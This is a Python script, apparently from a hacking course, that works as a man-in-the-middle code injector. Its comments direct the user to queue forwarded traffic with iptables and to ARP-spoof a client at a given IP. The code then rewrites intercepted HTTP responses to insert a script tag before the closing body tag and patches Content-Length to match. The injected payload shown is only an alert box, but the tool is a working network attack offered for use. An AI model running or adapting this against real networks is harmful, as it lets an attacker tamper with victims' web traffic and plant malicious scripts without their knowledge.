import netfilterqueue
import scapy.all as scapy
import optparse
import re

# Redirect outcome packets to a queue: `iptables -I FORWARD -j NFQUEUE --queue-num 0`
# Run ARP spoofing: python3 ARP_spoofing.py --client 192.168.233.140 --access-point 192.168.233.2
# Run Code injector: python3 code_injector.py

port = 80
ack_list = []

downloading_request_identifiers =["exe", "zip", "gz", "7z"]

def process_packet(packet):
    global ack_list, port

    try:
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):

            modified_load = scapy_packet[scapy.Raw].load.decode()

            if scapy_packet[scapy.TCP].dport == port or scapy_packet[scapy.TCP].dport == "http":
                # Handle Requests.
            
                # Remove accept encoding header in the load.
                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", modified_load)
                modified_load = re.sub("keep-alive", "close", modified_load)

            elif scapy_packet[scapy.TCP].sport == port or scapy_packet[scapy.TCP].sport == "http":
                # Inject JavaScript to the response.
                inject_code = "<script>alert('Injected code!');</script>"

                modified_load = modified_load.replace("</body>", inject_code + "</body>")
                content_length = re.search("(?:Content-Length:\s)(\d*)", modified_load)
                if content_length and "text/html" in modified_load:
                    content_length = content_length.group(1)
                    new_content_length = len(inject_code) + int(content_length)
                    modified_load = modified_load.replace(content_length, str(new_content_length))


            if modified_load != scapy_packet[scapy.Raw].load.decode():
                scapy_packet[scapy.Raw].load = modified_load.encode()
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))

        else:
            # Not handle another requests.
            pass
    
    except Exception as e:
        pass
        #print(e)
    # Forward packets to the target.
    packet.accept()


def main():

    global port

    parser = optparse.OptionParser()

    parser.add_option("-p", "--port", dest="port",
                      help="Target port.")

    parser.add_option("-l", "--location", dest="location",
                      help="Redirect location.")

    (options, arguments) = parser.parse_args()

    if options.port:
        port = int(options.port)

    queue = netfilterqueue.NetfilterQueue()

    # Bind to queue number 0.
    queue.bind(0, process_packet)
    queue.run()


if __name__ == "__main__":
    main()
